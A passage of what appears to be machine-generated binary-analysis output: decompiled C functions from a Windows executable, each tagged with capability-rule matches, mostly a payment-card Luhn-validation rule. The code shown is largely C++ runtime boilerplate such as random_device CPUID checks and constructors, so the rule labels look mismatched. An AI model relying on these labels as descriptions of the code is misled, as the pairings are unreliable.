        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x000140095b8f)\n// WARNING: Removing unreachable block (ram,0x000140095c53)\n// WARNING: Removing unreachable block (ram,0x000140095bd5)\n// WARNING: Removing unreachable block (ram,0x000140095b80)\n// WARNING: Removing unreachable block (ram,0x000140095bf0)\n// WARNING: Removing unreachable block (ram,0x000140095b63)\n\nvoid fcn.140095b00(ulong *arg1, uint64_t arg2)\n\n{\n    int32_t *piVar1;\n    int64_t iVar2;\n    int32_t iVar3;\n    ulong uVar4;\n    char *arg1_00;\n    uint64_t *puVar5;\n    uint32_t uVar6;\n    ulong *unaff_RBX;\n    uint64_t arg1_01;\n    uchar *unaff_RSI;\n    ulong unaff_RDI;\n    \ncode_r0x000140095b00:\n    *(*0x20 + -8) = unaff_RSI;\n    *(*0x20 + -0x10) = unaff_RBX;\n    *arg1 = 0;\n    arg1[1] = 0;\n    *(arg1 + 2) = 0xffffffff;\n    *(*0x20 + -0x40) = 0x140095b31;\n    iVar3 = fcn.14002fcd0(arg2, \"default\");\n    if (iVar3 != 0) {\n        *(*0x20 + -0x40) = 0x140095b5f;\n        iVar3 = fcn.14002fcd0(arg2, \"rdseed\");\n        arg1_01 = arg2;\n        if (iVar3 != 0) goto code_r0x000140095bc0;\n        piVar1 = cpuid_basic_info(0);\n        uVar6 = piVar1[1];\n        arg1_01 = uVar6;\n        if ((*piVar1 != 0) && ((uVar6 == 0x756e6547 || (uVar6 == 0x68747541)))) {\n            iVar2 = cpuid_Extended_Feature_Enumeration_info(7);\n            uVar6 = *(iVar2 + 4) & 0x40000;\n            arg1_01 = uVar6;\n            if (uVar6 != 0) {\ncode_r0x000140095b8a:\n                iVar2 = cpuid_Version_info(1);\n                uVar4 = 0x140081440;\n                if ((*(iVar2 + 0xc) & 0x40000000) == 0) {\n                    uVar4 = 0x140081210;\n                }\n                goto code_r0x000140095b3c;\n            }\n        }\ncode_r0x000140095bb0:\n        *(*0x20 + -0x40) = 0x140095bbc;\n        fcn.1400bd400(\"random_device::random_device(const std::string&): device not available\");\ncode_r0x000140095bc0:\n        *(*0x20 + -0x40) = 0x140095bcf;\n        iVar3 = fcn.14002fcd0(arg1_01, \"rdrand\");\n        if (iVar3 != 0) {\n            *(*0x20 + -0x40) = 0x140095c1f;\n            iVar3 = fcn.14002fcd0(arg1_01, \"rdrnd\");\n            if (iVar3 != 0) {\n                *(*0x20 + -0x40) = 0x140095c32;\n                iVar3 = fcn.14002fcd0(arg1_01, 0x14010b9c3);\n                if (iVar3 != 0) {\n                    *(*0x20 + -0x40) = 0x140095c7f;\n                    iVar3 = fcn.14002fcd0(arg1_01, \"hardware\");\n                    if (iVar3 != 0) goto code_r0x000140095c83;\n                }\n                if (iVar3 == 0) {\n                    piVar1 = cpuid_basic_info(0);\n                }\n                else if (iVar3 == 1) {\n                    piVar1 = cpuid_Version_info(1);\n                }\n                else if (iVar3 == 2) {\n                    piVar1 = cpuid_cache_tlb_info(2);\n                }\n                else if (iVar3 == 3) {\n                    piVar1 = cpuid_serial_info(3);\n                }\n                else if (iVar3 == 4) {\n                    piVar1 = cpuid_Deterministic_Cache_Parameters_info(4);\n                }\n                else if (iVar3 == 5) {\n                    piVar1 = cpuid_MONITOR_MWAIT_Features_info(5);\n                }\n                else if (iVar3 == 6) {\n                    piVar1 = cpuid_Thermal_Power_Management_info(6);\n                }\n                else if (iVar3 == 7) {\n                    piVar1 = cpuid_Extended_Feature_Enumeration_info(7);\n                }\n                else if (iVar3 == 9) {\n                    piVar1 = cpuid_Direct_Cache_Access_info(9);\n                }\n                else if (iVar3 == 10) {\n                    piVar1 = cpuid_Architectural_Performance_Monitoring_info(10);\n                }\n                else if (iVar3 == 0xb) {\n                    piVar1 = cpuid_Extended_Topology_info(0xb);\n                }\n                else if (iVar3 == 0xd) {\n                    piVar1 = cpuid_Processor_Extended_States_info(0xd);\n                }\n                else if (iVar3 == 0xf) {\n                    piVar1 = cpuid_Quality_of_Service_info(0xf);\n                }\n                else if (iVar3 == -0x7ffffffe) {\n                    piVar1 = cpuid_brand_part1_info(0x80000002);\n                }\n                else if (iVar3 == -0x7ffffffd) {\n                    piVar1 = cpuid_brand_part2_info(0x80000003);\n                }\n                else if (iVar3 == -0x7ffffffc) {\n                    piVar1 = cpuid_brand_part3_info(0x80000004);\n                }\n                else {\n                    piVar1 = cpuid(iVar3);\n                }\n                if ((*piVar1 != 0) &&\n                   (((piVar1[1] == 0x756e6547 || (piVar1[1] == 0x68747541)) &&\n                    (iVar2 = cpuid_Extended_Feature_Enumeration_info(7),  (*(iVar2 + 4) & 0x40000) != 0))))\n                goto code_r0x000140095b8a;\n            }\n        }\n        piVar1 = cpuid_basic_info(0);\n        uVar6 = piVar1[1];\n        arg1_01 = uVar6;\n        if ((*piVar1 != 0) && ((uVar6 == 0x756e6547 || (uVar6 == 0x68747541)))) {\n            iVar2 = cpuid_Version_info(1);\n            arg1_01 = *(iVar2 + 4);\n            if ((*(iVar2 + 0xc) & 0x40000000) != 0) {\n                arg1[1] = fcn.1400811c0;\n                return;\n            }\n        }\n        goto code_r0x000140095bb0;\n    }\n    goto code_r0x000140095b35;\ncode_r0x000140095c83:\n    puVar5 = 0x14010b9cf;\n    *(*0x20 + -0x40) = 0x140095c92;\n    iVar3 = fcn.14002fcd0(arg1_01, 0x14010b9cf);\n    if (iVar3 == 0) {\ncode_r0x000140095b35:\n        uVar4 = 0x1400812d0;\ncode_r0x000140095b3c:\n        arg1[1] = uVar4;\n        return;\n    }\n    arg1_00 = \"random_device::random_device(const std::string&): unsupported token\";\n    *(*0x20 + -0x40) = 0x140095ca6;\n    fcn.1400bd400(\"random_device::random_device(const std::string&): unsupported token\");\n    arg2 = *puVar5;\n    iVar2 = *(arg2 - 0x18);\n    *(*0x20 + -0x40) = unaff_RDI;\n    *(*0x20 + -0x48) = arg1;\n    *(*0x20 + -0x50) = arg1_01;\n    unaff_RSI = *0x20 + -0x60;\n    *(*0x20 + -0x70) = unaff_RSI;\n    if ((arg2 != 0) || (iVar2 == 0)) {\n        *(*0x20 + -0x98) = 0x140095aae;\n        fcn.1400a7360(*0x20 + -0x70, arg2, iVar2 + arg2);\n        *(*0x20 + -0x98) = 0x140095ab9;\n        fcn.140095b00(arg1_00, *0x20 + -0x70);\n        if (*(*0x20 + -0x70) != unaff_RSI) {\n            *(*0x20 + -0x98) = 0x140095ac8;\n            fcn.1400bc6c0();\n        }\n        return;\n    }\n    *(*0x20 + -0x98) = 0x140095add;\n    unaff_RBX = fcn.1400bd270(0x14010ba70);\n    if (*(*0x20 + -0x70) != unaff_RSI) {\n        *(*0x20 + -0x98) = 0x140095aef;\n        fcn.1400bc6c0();\n    }\n    *(*0x20 + -0x98) = 0x140095af7;\n    arg1 = unaff_RBX;\n    fcn.140014f30(unaff_RBX);\n    *0x20 = *0x20 + -0x90;\n    goto code_r0x000140095b00;\n}\n",
        "token_count": 2297
    },
    "140095db": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140095db0(int64_t *arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    \n    *arg1 = *0x140110510 + 0x10;\n    iVar1 = -1;\n    if (arg2 != 0) {\n        iVar1 = sub.msvcrt.dll_strlen(arg2);\n        iVar1 = arg2 + iVar1;\n    }\n    iVar1 = fcn.14007bb60(arg2, iVar1);\n    arg1[1] = iVar1;\n    return;\n}\n",
        "token_count": 121
    },
    "140095e1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140095e10(int64_t *arg1, ulong *arg2)\n\n{\n    ulong arg3;\n    \n    arg3 = arg2[1];\n    *arg1 = *0x140110510 + 0x10;\n    fcn.140082440(arg1 + 1, *arg2, arg3);\n    return;\n}\n",
        "token_count": 78
    },
    "1400b1da": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400b1da0(int64_t *arg1)\n\n{\n    *arg1 = 0x140119260;\n    fcn.1400a5760(arg1 + 2);\n    *arg1 = *0x140110650 + 0x10;\n    return;\n}\n",
        "token_count": 67
    },
    "1400b1f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400b1f00(int64_t *arg1)\n\n{\n    *arg1 = 0x1401192c0;\n    fcn.1400a5760(arg1 + 2);\n    *arg1 = *0x140110660 + 0x10;\n    return;\n}\n",
        "token_count": 69
    },
    "14009b0e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14009b0e0(int64_t *arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    \n    *arg1 = *0x140110510 + 0x10;\n    iVar1 = -1;\n    if (arg2 != 0) {\n        iVar1 = sub.msvcrt.dll_strlen(arg2);\n        iVar1 = arg2 + iVar1;\n    }\n    iVar1 = fcn.14007bb60(arg2, iVar1);\n    arg1[1] = iVar1;\n    *arg1 = *0x140110540 + 0x10;\n    return;\n}\n",
        "token_count": 140
    },
    "14009b63": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14009b630(int64_t *arg1)\n\n{\n    if (arg1[2] < arg1[3]) {\n        arg1[2] = arg1[2] + 1;\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x00014009b64b. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(*arg1 + 0x50))();\n    return;\n}\n",
        "token_count": 105
    },
    "1400a59d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400a59d0(int32_t **arg1, int32_t **arg2)\n\n{\n    int32_t *piVar1;\n    bool bVar2;\n    \n    piVar1 = *arg2;\n    bVar2 = piVar1 != *0x140108760;\n    *arg1 = piVar1;\n    if (bVar2) {\n        if (**0x14010fc90 != 0) {\n            LOCK();\n            *piVar1 = *piVar1 + 1;\n            return;\n        }\n        *piVar1 = *piVar1 + 1;\n    }\n    return;\n}\n",
        "token_count": 140
    },
    "14009bc0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14009bc00(ulong *arg1, int64_t arg2)\n\n{\n    int32_t *piVar1;\n    bool bVar2;\n    \n    *arg1 = 0x140118290;\n    arg1[1] = *(arg2 + 8);\n    arg1[2] = *(arg2 + 0x10);\n    arg1[3] = *(arg2 + 0x18);\n    arg1[4] = *(arg2 + 0x20);\n    arg1[5] = *(arg2 + 0x28);\n    arg1[6] = *(arg2 + 0x30);\n    piVar1 = *(arg2 + 0x38);\n    bVar2 = piVar1 != *0x140108760;\n    arg1[7] = piVar1;\n    if (bVar2) {\n        if (**0x14010fc90 != 0) {\n            LOCK();\n            *piVar1 = *piVar1 + 1;\n            return;\n        }\n        *piVar1 = *piVar1 + 1;\n    }\n    return;\n}\n",
        "token_count": 249
    },
    "14009bd1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.14009bd10(int64_t arg1, int64_t arg2)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    uint uVar7;\n    uint uVar8;\n    uint uVar9;\n    uint uVar10;\n    uint uVar11;\n    \n    uVar1 = *(arg2 + 0x18);\n    uVar2 = *(arg2 + 0x1c);\n    uVar3 = *(arg2 + 0x20);\n    uVar4 = *(arg2 + 0x24);\n    uVar5 = *(arg2 + 0x28);\n    uVar6 = *(arg2 + 0x2c);\n    uVar7 = *(arg2 + 0x30);\n    uVar8 = *(arg2 + 0x34);\n    uVar9 = *(arg2 + 0xc);\n    uVar10 = *(arg2 + 0x10);\n    uVar11 = *(arg2 + 0x14);\n    *(arg1 + 8) = *(arg2 + 8);\n    *(arg1 + 0xc) = uVar9;\n    *(arg1 + 0x10) = uVar10;\n    *(arg1 + 0x14) = uVar11;\n    *(arg1 + 0x18) = uVar1;\n    *(arg1 + 0x1c) = uVar2;\n    *(arg1 + 0x20) = uVar3;\n    *(arg1 + 0x24) = uVar4;\n    *(arg1 + 0x28) = uVar5;\n    *(arg1 + 0x2c) = uVar6;\n    *(arg1 + 0x30) = uVar7;\n    *(arg1 + 0x34) = uVar8;\n    fcn.1400a5b40(arg1 + 0x38, arg2 + 0x38);\n    return arg1;\n}\n",
        "token_count": 460
    },
    "14009c0a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14009c0a0(int64_t *arg1)\n\n{\n    if (arg1[2] < arg1[3]) {\n        arg1[2] = arg1[2] + 2;\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x00014009c0bb. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(*arg1 + 0x50))();\n    return;\n}\n",
        "token_count": 107
    },
    "14009c67": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14009c670(ulong *arg1, int64_t arg2)\n\n{\n    int32_t *piVar1;\n    bool bVar2;\n    \n    *arg1 = 0x140118310;\n    arg1[1] = *(arg2 + 8);\n    arg1[2] = *(arg2 + 0x10);\n    arg1[3] = *(arg2 + 0x18);\n    arg1[4] = *(arg2 + 0x20);\n    arg1[5] = *(arg2 + 0x28);\n    arg1[6] = *(arg2 + 0x30);\n    piVar1 = *(arg2 + 0x38);\n    bVar2 = piVar1 != *0x140108760;\n    arg1[7] = piVar1;\n    if (bVar2) {\n        if (**0x14010fc90 != 0) {\n            LOCK();\n            *piVar1 = *piVar1 + 1;\n            return;\n        }\n        *piVar1 = *piVar1 + 1;\n    }\n    return;\n}\n",
        "token_count": 249
    },
    "14009c78": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.14009c780(int64_t arg1, int64_t arg2)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    uint uVar7;\n    uint uVar8;\n    uint uVar9;\n    uint uVar10;\n    uint uVar11;\n    \n    uVar1 = *(arg2 + 0x18);\n    uVar2 = *(arg2 + 0x1c);\n    uVar3 = *(arg2 + 0x20);\n    uVar4 = *(arg2 + 0x24);\n    uVar5 = *(arg2 + 0x28);\n    uVar6 = *(arg2 + 0x2c);\n    uVar7 = *(arg2 + 0x30);\n    uVar8 = *(arg2 + 0x34);\n    uVar9 = *(arg2 + 0xc);\n    uVar10 = *(arg2 + 0x10);\n    uVar11 = *(arg2 + 0x14);\n    *(arg1 + 8) = *(arg2 + 8);\n    *(arg1 + 0xc) = uVar9;\n    *(arg1 + 0x10) = uVar10;\n    *(arg1 + 0x14) = uVar11;\n    *(arg1 + 0x18) = uVar1;\n    *(arg1 + 0x1c) = uVar2;\n    *(arg1 + 0x20) = uVar3;\n    *(arg1 + 0x24) = uVar4;\n    *(arg1 + 0x28) = uVar5;\n    *(arg1 + 0x2c) = uVar6;\n    *(arg1 + 0x30) = uVar7;\n    *(arg1 + 0x34) = uVar8;\n    fcn.1400a5b40(arg1 + 0x38, arg2 + 0x38);\n    return arg1;\n}\n",
        "token_count": 460
    },
    "14009d64": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14009d640(int64_t *arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    \n    *arg1 = *0x140110510 + 0x10;\n    iVar1 = -1;\n    if (arg2 != 0) {\n        iVar1 = sub.msvcrt.dll_strlen(arg2);\n        iVar1 = arg2 + iVar1;\n    }\n    iVar1 = fcn.14007bb60(arg2, iVar1);\n    arg1[1] = iVar1;\n    *arg1 = *0x140110590 + 0x10;\n    return;\n}\n",
        "token_count": 138
    },
    "14009e99": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14009e990(int64_t *arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    \n    *arg1 = *0x140110460 + 0x10;\n    iVar1 = -1;\n    if (arg2 != 0) {\n        iVar1 = sub.msvcrt.dll_strlen(arg2);\n        iVar1 = arg2 + iVar1;\n    }\n    iVar1 = fcn.14007bb60(arg2, iVar1);\n    arg1[1] = iVar1;\n    *arg1 = *0x1401105c0 + 0x10;\n    return;\n}\n",
        "token_count": 140
    },
    "1400a28f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.1400a28f0(ulong *arg1, int64_t arg2)\n\n{\n    uchar uVar1;\n    ushort uVar2;\n    int32_t iVar3;\n    ulong uVar4;\n    uint64_t uVar5;\n    int64_t iVar6;\n    \n    *(arg1 + 1) = arg2 != 0;\n    *arg1 = 0x140119060;\n    uVar4 = fcn.1400a5680();\n    arg1[2] = uVar4;\n    *(arg1 + 3) = 0;\n    iVar6 = 0;\n    do {\n        iVar3 = fcn.140015880();\n        if (iVar3 == -1) {\n            uVar1 = 0;\n            goto code_r0x0001400a282f;\n        }\n        *(arg1 + iVar6 + 0x19) = iVar3;\n        iVar6 = iVar6 + 1;\n    } while (iVar6 != 0x80);\n    uVar1 = 1;\ncode_r0x0001400a282f:\n    *(arg1 + 3) = uVar1;\n    uVar5 = 0;\n    do {\n        uVar2 = fcn.140015810(uVar5 & 0xffffffff);\n        *(arg1 + uVar5 * 2 + 0x9a) = uVar2;\n        uVar5 = uVar5 + 1;\n    } while (uVar5 != 0x100);\n    iVar6 = 0;\n    do {\n        *(arg1 + iVar6 * 2 + 0x29a) = 1 << (iVar6 & 0x1f);\n        uVar2 = fcn.14002bd40();\n        *(arg1 + iVar6 * 2 + 0x2ba) = uVar2;\n        iVar6 = iVar6 + 1;\n    } while (iVar6 != 0x10);\n    return;\n}\n",
        "token_count": 434
    },
    "1400a299": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400a2990(int64_t *arg1)\n\n{\n    *arg1 = 0x140119060;\n    fcn.1400a5760(arg1 + 2);\n    *arg1 = *0x140110640 + 0x10;\n    return;\n}\n",
        "token_count": 66
    },
    "1400a2b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400a2b00(int64_t arg1, ulong *arg2)\n\n{\n    int32_t iVar1;\n    ulong uVar2;\n    ulong uVar3;\n    ulong uVar4;\n    ulong uVar5;\n    ulong uVar6;\n    ulong uVar7;\n    int32_t *piVar8;\n    ulong uVar9;\n    int64_t iVar10;\n    int64_t iVar11;\n    int64_t iVar12;\n    \n    uVar2 = *arg2;\n    uVar3 = arg2[1];\n    *0x1401084e0 = *0x140110730 + 0x10;\n    *0x1401084e8 = 1;\n    uVar4 = arg2[2];\n    *0x1401084f0 = uVar2;\n    fcn.1400b3d40(0x1401084e0);\n    piVar8 = *0x14010fc90;\n    if (**0x14010fc90 != 0) {\n        LOCK();\n    }\n    *0x1401084e8 = *0x1401084e8 + 1;\n    iVar12 = *(arg1 + 8);\n    iVar10 = fcn.14002c080(*0x1401101b0);\n    *(iVar12 + iVar10 * 8) = 0x1401084e0;\n    *0x140108608 = 1;\n    *0x140108600 = *0x1401106c0 + 0x10;\n    *0x140108610 = fcn.1400a5680();\n    if (*piVar8 != 0) {\n        LOCK();\n    }\n    *0x140108608 = *0x140108608 + 1;\n    iVar12 = *(arg1 + 8);\n    iVar10 = fcn.14002c080(*0x140110100);\n    *(iVar12 + iVar10 * 8) = 0x140108600;\n    *0x140108588 = 1;\n    *0x140108580 = *0x140110420 + 0x10;\n    *0x140108590 = uVar3;\n    fcn.14007ebc0(0x140108580);\n    if (*piVar8 != 0) {\n        LOCK();\n    }\n    *0x140108588 = *0x140108588 + 1;\n    iVar12 = *(arg1 + 8);\n    iVar10 = fcn.14002c080(*0x14010fe00);\n    *(iVar12 + iVar10 * 8) = 0x140108580;\n    *0x1401085a8 = 1;\n    *0x1401085a0 = *0x140110430 + 0x10;\n    *0x1401085b0 = uVar4;\n    fcn.14007ef90(0x1401085a0);\n    if (*piVar8 != 0) {\n        LOCK();\n    }\n    *0x1401085a8 = *0x1401085a8 + 1;\n    iVar12 = *(arg1 + 8);\n    iVar10 = fcn.14002c080(*0x14010fe10);\n    *(iVar12 + iVar10 * 8) = 0x1401085a0;\n    *0x140108540 = *0x1401107c0 + 0x10;\n    if (*piVar8 != 0) {\n        LOCK();\n    }\n    *0x140108548 = 2;\n    iVar12 = *(arg1 + 8);\n    iVar10 = fcn.14002c080(*0x140110220);\n    *(iVar12 + iVar10 * 8) = 0x140108540;\n    *0x140108560 = *0x1401107e0 + 0x10;\n    if (*piVar8 != 0) {\n        LOCK();\n    }\n    *0x140108568 = 2;\n    iVar12 = *(arg1 + 8);\n    iVar10 = fcn.14002c080(*0x140110240);\n    *(iVar12 + iVar10 * 8) = 0x140108560;\n    *0x140108520 = *0x140110750 + 0x10;\n    if (*piVar8 != 0) {\n        LOCK();\n    }\n    *0x140108528 = 2;\n    iVar12 = *(arg1 + 8);\n    iVar10 = fcn.14002c080(*0x1401101d0);\n    *(iVar12 + iVar10 * 8) = 0x140108520;\n    fcn.1400b39f0(0x1401084a0, 1);\n    if (*piVar8 != 0) {\n        LOCK();\n    }\n    *0x1401084a8 = *0x1401084a8 + 1;\n    iVar12 = *(arg1 + 8);\n    iVar10 = fcn.14002c080(*0x140110190);\n    *(iVar12 + iVar10 * 8) = 0x1401084a0;\n    uVar5 = arg2[5];\n    uVar6 = arg2[3];\n    uVar7 = arg2[4];\n    *0x140108508 = 1;\n    *0x140108500 = *0x140110740 + 0x10;\n    *0x140108510 = uVar6;\n    fcn.1400b4100(0x140108500);\n    if (*piVar8 != 0) {\n        LOCK();\n    }\n    *0x140108508 = *0x140108508 + 1;\n    iVar12 = *(arg1 + 8);\n    iVar10 = fcn.14002c080(*0x1401101c0);\n    *(iVar12 + iVar10 * 8) = 0x140108500;\n    *0x140108628 = 1;\n    *0x140108620 = *0x1401106d0 + 0x10;\n    *0x140108630 = fcn.1400a5680();\n    if (*piVar8 != 0) {\n        LOCK();\n    }\n    *0x140108628 = *0x140108628 + 1;\n    iVar12 = *(arg1 + 8);\n    iVar10 = fcn.14002c080(*0x140110110);\n    *(iVar12 + iVar10 * 8) = 0x140108620;\n    *0x1401085c8 = 1;\n    *0x1401085c0 = *0x140110440 + 0x10;\n    *0x1401085d0 = uVar7;\n    fcn.14007f360(0x1401085c0);\n    if (*piVar8 != 0) {\n        LOCK();\n    }\n    *0x1401085c8 = *0x1401085c8 + 1;\n    iVar12 = *(arg1 + 8);\n    iVar10 = fcn.14002c080(*0x14010fe20);\n    *(iVar12 + iVar10 * 8) = 0x1401085c0;\n    *0x1401085e8 = 1;\n    *0x1401085e0 = *0x140110450 + 0x10;\n    *0x1401085f0 = uVar5;\n    fcn.14007f740(0x1401085e0);\n    if (*piVar8 != 0) {\n        LOCK();\n    }\n    *0x1401085e8 = *0x1401085e8 + 1;\n    iVar12 = *(arg1 + 8);\n    iVar10 = fcn.14002c080(*0x14010fe30);\n    iVar1 = *piVar8;\n    *(iVar12 + iVar10 * 8) = 0x1401085e0;\n    *0x140108550 = *0x1401107d0 + 0x10;\n    if (iVar1 != 0) {\n        LOCK();\n    }\n    *0x140108558 = 2;\n    iVar12 = *(arg1 + 8);\n    iVar10 = fcn.14002c080(*0x140110230);\n    iVar1 = *piVar8;\n    *(iVar12 + iVar10 * 8) = 0x140108550;\n    *0x140108570 = *0x1401107f0 + 0x10;\n    if (iVar1 != 0) {\n        LOCK();\n    }\n    *0x140108578 = 2;\n    iVar12 = *(arg1 + 8);\n    iVar10 = fcn.14002c080(*0x140110250);\n    iVar1 = *piVar8;\n    *(iVar12 + iVar10 * 8) = 0x140108570;\n    *0x140108530 = *0x140110760 + 0x10;\n    if (iVar1 != 0) {\n        LOCK();\n    }\n    *0x140108538 = 2;\n    iVar12 = *(arg1 + 8);\n    iVar10 = fcn.14002c080(*0x1401101e0);\n    *(iVar12 + iVar10 * 8) = 0x140108530;\n    fcn.1400b3bc0(0x1401084c0, 1);\n    if (*piVar8 != 0) {\n        LOCK();\n    }\n    *0x1401084c8 = *0x1401084c8 + 1;\n    iVar12 = *(arg1 + 8);\n    iVar10 = fcn.14002c080(*0x1401101a0);\n    uVar9 = *0x1401101b0;\n    *(iVar12 + iVar10 * 8) = 0x1401084c0;\n    iVar12 = *(arg1 + 0x18);\n    iVar10 = fcn.14002c080(uVar9);\n    uVar9 = *0x14010fe00;\n    *(iVar12 + iVar10 * 8) = uVar2;\n    iVar12 = *(arg1 + 0x18);\n    iVar10 = fcn.14002c080(uVar9);\n    uVar2 = *0x14010fe10;\n    *(iVar12 + iVar10 * 8) = uVar3;\n    iVar12 = *(arg1 + 0x18);\n    iVar10 = fcn.14002c080(uVar2);\n    uVar2 = *0x1401101c0;\n    *(iVar12 + iVar10 * 8) = uVar4;\n    iVar12 = *(arg1 + 0x18);\n    iVar10 = fcn.14002c080(uVar2);\n    uVar2 = *0x14010fe20;\n    *(iVar12 + iVar10 * 8) = uVar6;\n    iVar12 = *(arg1 + 0x18);\n    iVar11 = fcn.14002c080(uVar2);\n    uVar2 = *0x14010fe30;\n    iVar10 = *(arg1 + 0x18);\n    *(iVar12 + iVar11 * 8) = uVar7;\n    iVar12 = fcn.14002c080(uVar2);\n    *(iVar10 + iVar12 * 8) = uVar5;\n    return;\n}\n",
        "token_count": 2526
    },
    "1400a463": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400a4630(uint *arg1, ulong arg2)\n\n{\n    ulong uVar1;\n    ushort *puVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    ulong *puVar6;\n    uchar auStack168 [16];\n    uchar auStack152 [16];\n    uchar auStack136 [16];\n    \n    *0x140107848 = 0;\n    *0x140107828 = 0;\n    *0x14010782c = 0;\n    *0x140107830 = 0;\n    *0x140107834 = 0;\n    *0x140107838 = 0;\n    *0x14010783c = 0;\n    *0x140107840 = 0;\n    *0x140107844 = 0;\n    *arg1 = arg2;\n    *(arg1 + 4) = 0x30;\n    puVar6 = 0x140107a60;\n    for (iVar5 = 0x30; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    *(arg1 + 2) = 0x140107a60;\n    *(arg1 + 6) = 0x140107860;\n    puVar6 = 0x140107860;\n    for (iVar5 = 0x30; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    *(arg1 + 8) = 0x140107820;\n    *0x140107820 = 0x1401072d0;\n    puVar2 = fcn.1400a5670(0);\n    *0x1401072d0 = *puVar2;\n    fcn.1400a25f0(0x1401072e0, 0, 0, 1);\n    fcn.1400a3cb0(arg1, *0x14010ff30, 0x1401072e0);\n    fcn.1400b1ce0(0x1401079e0, 1);\n    fcn.1400a3cb0(arg1, *0x1401100e0, 0x1401079e0);\n    *0x140106be8 = 1;\n    *0x140106be0 = *0x1401105a0 + 0x10;\n    *0x140106c00 = 0;\n    *0x140106bf0 = 0;\n    *0x140106940 = *0x140110370 + 0x10;\n    *0x140106bf8 = 0;\n    *0x140106c08 = 0;\n    *0x140106c10 = 0;\n    *0x140106c18 = 0;\n    *0x140106c20 = 0;\n    *0x140106c28 = 0;\n    *0x140106c68 = 0;\n    *0x140106948 = 1;\n    *0x140106950 = 0x140106be0;\n    fcn.1400b10e0(0x140106940);\n    fcn.1400a3cb0(arg1, *0x140110020, 0x140106940);\n    *0x140107be8 = 1;\n    *0x140107be0 = *0x1401106e0 + 0x10;\n    fcn.1400a3cb0(arg1, *0x140110120, 0x140107be0);\n    *0x140107c08 = 1;\n    *0x140107c00 = *0x140110700 + 0x10;\n    